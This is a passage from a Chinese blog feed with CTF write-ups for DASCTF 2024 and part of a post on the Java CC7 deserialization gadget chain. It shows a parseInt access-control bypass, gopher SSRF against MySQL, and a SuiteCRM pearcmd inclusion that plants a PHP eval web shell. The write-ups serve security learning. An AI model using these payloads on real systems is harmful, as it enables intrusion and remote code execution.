class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;express&quot;</span>;<br><span class="hljs-keyword">import</span> jwt <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;jsonwebtoken&quot;</span>;<br><span class="hljs-keyword">import</span> cookieParser <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;cookie-parser&quot;</span>;<br><span class="hljs-keyword">import</span> crypto <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;crypto&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">DASFLAG</span> || <span class="hljs-string">&quot;DASCTF&#123;fake_flag&#125;&quot;</span>;<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&quot;static&quot;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;view engine&quot;</span>, <span class="hljs-string">&quot;ejs&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">JWT_SECRET</span> = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">64</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&quot;hex&quot;</span>);<br><br><span class="hljs-keyword">const</span> articles = [<br>    &#123;<br>        <span class="hljs-attr">line1</span>: <span class="hljs-string">&quot;我还是在这里 我还是&quot;</span>,<br>        <span class="hljs-attr">line2</span>: <span class="hljs-string">&quot;如约而至地出现了&quot;</span><br>    &#125;,<br>    &#123;<br>        <span class="hljs-attr">line1</span>: <span class="hljs-string">&quot;你们有成为更好的自己吗&quot;</span>,<br>        <span class="hljs-attr">line2</span>: <span class="hljs-string">&quot;真的吗 那可太好了&quot;</span><br>    &#125;,<br>    &#123;<br>        <span class="hljs-attr">line1</span>: <span class="hljs-string">&quot;你知道吗 我经常说&quot;</span>,<br>        <span class="hljs-attr">line2</span>: <span class="hljs-string">&quot;把更多的时间花在 CTF 上（？）&quot;</span><br>    &#125;,<br>    &#123;<br>        <span class="hljs-attr">line1</span>: <span class="hljs-string">&quot;这是一种信念感&quot;</span>,<br>        <span class="hljs-attr">line2</span>: <span class="hljs-string">&quot;就像我出来那给你们&quot;</span><br>    &#125;,<br>    &#123;<br>        <span class="hljs-attr">line1</span>: <span class="hljs-string">&quot;我也希望你们能把更多时间花在热爱的事情上&quot;</span>,<br>        <span class="hljs-attr">line2</span>: <span class="hljs-string">&quot;我是一个特别固执的人&quot;</span><br>    &#125;,<br>    &#123;<br>        <span class="hljs-attr">line1</span>: <span class="hljs-string">&quot;我从来不会在意别人跟我说什么&quot;</span>,<br>        <span class="hljs-attr">line2</span>: <span class="hljs-string">&quot;让我去做以及怎么做 我不管&quot;</span><br>    &#125;,<br>    &#123;<br>        <span class="hljs-attr">line1</span>: <span class="hljs-string">&quot;如果 你也可以像我一样&quot;</span>,<br>        <span class="hljs-attr">line2</span>: <span class="hljs-string">&quot;那我觉得 这件事情&quot;</span><br>    &#125;,<br>    &#123;<br>        <span class="hljs-attr">line1</span>: <span class="hljs-string">&quot;欢迎参加 DASCTF x GFCTF 2024！&quot;</span>,<br>        <span class="hljs-attr">line2</span>: <span class="hljs-variable constant_">FLAG</span>,<br>    &#125;,<br>];<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> token = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>;<br>    <span class="hljs-keyword">if</span> (token) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> decoded = jwt.<span class="hljs-title function_">verify</span>(token, <span class="hljs-variable constant_">JWT_SECRET</span>);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;home&quot;</span>, &#123;<br>                <span class="hljs-attr">username</span>: decoded.<span class="hljs-property">username</span>,<br>                <span class="hljs-attr">subscription</span>: decoded.<span class="hljs-property">subscription</span>,<br>                <span class="hljs-attr">articles</span>: articles,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>            res.<span class="hljs-title function_">clearCookie</span>(<span class="hljs-string">&quot;token&quot;</span>);<br>            res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/register&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/register&quot;</span>);<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/register&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;register&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/register&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> &#123; username, voucher &#125; = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> username === <span class="hljs-string">&quot;string&quot;</span> &amp;&amp; (!voucher || <span class="hljs-keyword">typeof</span> voucher === <span class="hljs-string">&quot;string&quot;</span>)) &#123;<br>        <span class="hljs-keyword">const</span> subscription = (voucher === <span class="hljs-variable constant_">FLAG</span> + <span class="hljs-variable constant_">JWT_SECRET</span> ? <span class="hljs-string">&quot;premium&quot;</span> : <span class="hljs-string">&quot;guest&quot;</span>);<br>        <span class="hljs-keyword">if</span> (voucher &amp;&amp; subscription === <span class="hljs-string">&quot;guest&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;邀请码无效&quot;</span> &#125;);<br>        &#125;<br>        <span class="hljs-keyword">const</span> userToken = jwt.<span class="hljs-title function_">sign</span>(&#123; username, subscription &#125;, <span class="hljs-variable constant_">JWT_SECRET</span>, &#123;<br>            <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">&quot;1d&quot;</span>,<br>        &#125;);<br>        res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&quot;token&quot;</span>, userToken, &#123; <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span> &#125;);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;注册成功&quot;</span>, subscription &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;用户名或邀请码无效&quot;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/article&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> token = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>;<br>    <span class="hljs-keyword">if</span> (token) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> decoded = jwt.<span class="hljs-title function_">verify</span>(token, <span class="hljs-variable constant_">JWT_SECRET</span>);<br>            <span class="hljs-keyword">let</span> index = req.<span class="hljs-property">body</span>.<span class="hljs-property">index</span>;<br>            <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">index</span> &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;你知道我要说什么&quot;</span> &#125;);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (decoded.<span class="hljs-property">subscription</span> !== <span class="hljs-string">&quot;premium&quot;</span> &amp;&amp; index &gt;= <span class="hljs-number">7</span>) &#123;<br>                <span class="hljs-keyword">return</span> res<br>                    .<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>)<br>                    .<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;订阅高级会员以解锁&quot;</span> &#125;);<br>            &#125;<br>            index = <span class="hljs-built_in">parseInt</span>(index);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Number</span>.<span class="hljs-built_in">isNaN</span>(index) || index &gt; articles.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;你知道我要说什么&quot;</span> &#125;);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(articles[index]);<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>            res.<span class="hljs-title function_">clearCookie</span>(<span class="hljs-string">&quot;token&quot;</span>);<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;重新登录罢&quot;</span> &#125;);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;未登录&quot;</span> &#125;);<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;3000&quot;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>鉴权太完美了，不能通过获取secret_key来构造会员身份，那就只能想办法绕过检测直接读flag，</p><p>漏洞点就是这一句话：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">index = <span class="hljs-built_in">parseInt</span>(index);<br></code></pre></td></tr></table></figure><blockquote><p>parseInt(string, radix) 解析一个字符串并返回指定基数的十进制整数，radix 是 2-36 之间的整数，表示被解析字符串的基数。</p></blockquote><p>跟php的intval()函数差不多。根据前面两个if，我们的index不能小于，不能大于等于7。那么我们传入比如：</p><p><code>7?</code>这就绕过了前面两个if，然后经过parseInt变成了7，就读到flag了。</p><p><img src="/img/DASCTF2024%E6%A0%A1%E8%B5%9B/image-20240420200147775.png" alt="image-20240420200147775"></p><h1 id="EasySignin"><a href="#EasySignin" class="headerlink" title="EasySignin"></a>EasySignin</h1><p>注册帐号登录后有两个点，第一个是看图片，进去提示我们不能看，怀疑是鉴权。第二个是更改当前用户密码，随便写点什么，抓包，发现postbody是这样的：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username=a&amp;<span class="hljs-built_in">new</span>-<span class="hljs-keyword">password</span>=aaa&amp;confirm-<span class="hljs-keyword">password</span>=aaa<br></code></pre></td></tr></table></figure><p>尝试修改username为admin。</p><p><img src="/img/DASCTF2024%E6%A0%A1%E8%B5%9B/image-20240420200718438.png" alt="image-20240420200718438"></p><p>提示我们修改成功，看来这里没有任何过滤，拿去登录。</p><p><img src="/img/DASCTF2024%E6%A0%A1%E8%B5%9B/image-20240420200756412.png" alt="image-20240420200756412"></p><p>成功登录admin。那利用点只有看图片这里了。这里的参数是url，看见后面第一反应是文件包含，后来发现本地文件无法包含，又怀疑是ssrf。尝试gopher伪协议：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher://ip:port/_aaa<br></code></pre></td></tr></table></figure><p>服务器起监听，这边收到了aaa，说明可以用。尝试用dict伪协议查询开了哪些服务，结果发现被这个被ban了。那只有盲打。测试过打redis、fastcgi、mysql。其实我这里笨了，有注册登录应该第一反应是打mysql的。</p><p>ssfr打mysql能打通，利用gopherus工具，构造mysql查询语句直接读文件：</p><p><img src="/img/DASCTF2024%E6%A0%A1%E8%B5%9B/image-20240420201948086.png" alt="image-20240420201948086"></p><p>直接打进去不行，flag和flie被过滤了。</p><p><img src="/img/DASCTF2024%E6%A0%A1%E8%B5%9B/image-20240420202052414.png" alt="image-20240420202052414"></p><p>那就url二次编码：</p><p><img src="/img/DASCTF2024%E6%A0%A1%E8%B5%9B/image-20240420202156034.png" alt="image-20240420202156034"></p><p>把生成的这一段拿去base64解密：</p><p><img src="/img/DASCTF2024%E6%A0%A1%E8%B5%9B/image-20240420202244144.png" alt="image-20240420202244144"></p><h1 id="SuiteCRM"><a href="#SuiteCRM" class="headerlink" title="SuiteCRM"></a>SuiteCRM</h1><p>卡在修改端口了&#x3D;-&#x3D;，我burp改端口掩耳盗铃了属于是。</p><p>提示已经放的很明显了。先Username&#x2F;Password：suitecrm:suitecrm登录进去：</p><p>提示给了CVE，发现存在文件包含漏洞。包含点就在index.php，包含结构为：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">index</span>.php/(被包含文件绝对路径)<br></code></pre></td></tr></table></figure><p>我们知道，docker环境下是会默认安装pear的，直接pearcmd文件包含：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/index.php/<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/lib/php</span><span class="hljs-regexp">/pearcmd.php?+config-create+/</span>&amp;file=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/lib/php</span><span class="hljs-regexp">/pearcmd.php&amp;/</span>&lt;<span class="hljs-string">?=</span><span class="hljs-variable">@eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">123</span>]);<span class="hljs-string">?&gt;</span>+<span class="hljs-regexp">/tmp/test</span>.php<br></code></pre></td></tr></table></figure><p>但是这样不行，这道题端口转发有问题，要手动改81端口（卡这好久）。</p><p><img src="/img/DASCTF2024%E6%A0%A1%E8%B5%9B/image-20240420202951770.png" alt="image-20240420202951770"></p><p>然后重新发包就能写进去文件了：</p><p><img src="/img/DASCTF2024%E6%A0%A1%E8%B5%9B/image-20240420203013119.png" alt="image-20240420203013119"></p><p>包含&#x2F;tmp&#x2F;test.php即可</p><p><img src="/img/DASCTF2024%E6%A0%A1%E8%B5%9B/image-20240420203107583.png" alt="image-20240420203107583"></p><h1 id="web1234"><a href="#web1234" class="headerlink" title="web1234"></a>web1234</h1><p>这道题得到许可后再放wp</p><p>看看刚做EasySignin的吐槽QWQ：</p><p><img src="/img/DASCTF2024%E6%A0%A1%E8%B5%9B/image-20240420203246375.png" alt="image-20240420203246375"></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化——CC7链及CC链总结</title>
    <link href="/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/"/>
    <url>/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>跟CC5一样，也是利用CC1的LazyMap.get及之后的部分，也是只改了开头。</p><p>这次是利用Hashtable.readObject方法，这个类是可以序列化的。</p><h1 id="寻找"><a href="#寻找" class="headerlink" title="寻找"></a>寻找</h1><p>在AbstractMap类里的equals方法调用了get方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>    …………<br>            <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-literal">null</span> &amp;&amp; m.containsKey(key)))   <span class="hljs-comment">//调用get</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>…………<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在Hashtable类的reconstitutionPut方法调用了equals方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span> <span class="hljs-keyword">throws</span> StreamCorruptedException&#123;<br>      …………<br>        <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;      <span class="hljs-comment">//调用equals</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br>…………<br>    &#125;<br></code></pre></td></tr></table></figure><p>在本类的readObject调用了reconstitutionPut方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        …………<br>        reconstitutionPut(table, key, value);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h1><p>看一下equals方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-comment">//判断1是否为同一对象</span><br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-comment">//判断2运行类型是否不是Map</span><br>    <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">//向上转型</span><br>    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>    <span class="hljs-comment">//判断HashMap的元素的个数size</span><br>    <span class="hljs-keyword">if</span> (m.size() != size())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//获取HashMap的迭代器</span><br>        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();<br>        <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<br>            <span class="hljs-comment">//获取每个元素（Node）</span><br>            Entry&lt;K,V&gt; e = i.next();<br>            <span class="hljs-comment">//获取key和value</span><br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();<br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();<br>            <span class="hljs-comment">//判断3如果value为null，则判断key</span><br>            <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-literal">null</span> &amp;&amp; m.containsKey(key)))<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//如果value不为null，判断value内容是否相同</span><br>                <span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (NullPointerException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>它进行了三个判断：</p><blockquote><ol><li>判断是否为同一对象</li><li>判断对象的运行类型</li><li>判断Map中元素的个数</li></ol></blockquote><p>当以上三个判断都不满足的情况下，则进一步判断Map中的元素，也就是判断元素的key和value的内容是否相同，在value不为null的情况下，m会调用get方法获取key的内容，虽然对象o向上转型成Map类型，但是m对象本质上是一个LazyMap。因此m对象调用get方法时实际上是调用了LazyMap的get方法。</p><p>看看Hashtable的readObject方法，这个方法没什么需要注意的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">// Read in the length, threshold, and loadfactor</span><br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// 读取table数组的容量</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">origlength</span> <span class="hljs-operator">=</span> s.readInt();<br>    <span class="hljs-comment">//读取table数组的元素个数</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">elements</span> <span class="hljs-operator">=</span> s.readInt();<br><br>    <span class="hljs-comment">//计算table数组的length</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(elements * loadFactor) + (elements / <span class="hljs-number">20</span>) + <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)<br>        length--;<br>    <span class="hljs-keyword">if</span> (origlength &gt; <span class="hljs-number">0</span> &amp;&amp; length &gt; origlength)<br>        length = origlength;<br>    <span class="hljs-comment">//根据length创建table数组</span><br>    table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;?,?&gt;[length];<br>    threshold = (<span class="hljs-type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);<br>    count = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">//反序列化，还原table数组</span><br>    <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();<br>        reconstitutionPut(table, key, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们再来看看reconstitutionPut方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span> <span class="hljs-keyword">throws</span> StreamCorruptedException &#123;<br><span class="hljs-comment">//value不能为null</span><br>       <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>       &#125;<br><br><span class="hljs-comment">//重新计算key的hash值</span><br>       <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br><span class="hljs-comment">//根据hash值计算存储索引</span><br>       <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br><span class="hljs-comment">//判断元素的key是否重复</span><br>       <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br><span class="hljs-comment">//如果key重复则抛出异常</span><br>           <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>           &#125;<br>       &#125;<br>       <span class="hljs-comment">//key不重复则将元素添加到table数组中</span><br>       <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>           Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>       tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>       count++;<br>   &#125;<br></code></pre></td></tr></table></figure><p>reconstitutionPut方法首先对value进行不为null的校验，否则抛出反序列化异常，然后根据key计算出元素在table数组中的存储索引，判断元素在table数组中是否重复，如果重复则抛出异常，如果不重复则将元素转换成Entry并添加到tabl数组中。</p><p>CC7利用链的漏洞触发的关键就在reconstitutionPut方法中，该方法在判断重复元素的时候校验了两个元素的hash值是否一样，然后接着key会调用equals方法判断key是否重复时就会触发漏洞。</p><blockquote><p>需要注意的是，在添加第一个元素时并不会进入if语句调用equals方法进行判断，因此Hashtable中的元素至少为2个并且元素的hash值也必须相同的情况下才会调用equals方法，否则不会触发漏洞。</p></blockquote><hr style="border: 1px solid black;"/><p>所以我们这里至少需要两个map：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span 